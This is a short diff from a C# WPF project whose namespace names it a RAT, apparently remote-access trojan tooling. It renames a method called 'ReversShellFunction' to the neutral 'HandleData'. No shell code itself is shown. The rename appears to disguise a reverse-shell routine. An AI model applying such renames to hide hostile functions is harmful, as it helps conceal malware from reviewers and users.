@@ -66,7 +66,7 @@ namespace ArkerRatWpfVersion
 
         }
 
-        public async Task ReversShellFunction(string data)
+        public async Task HandleData(string data)
         {
             lock (GlobalVariables._lock)
             {
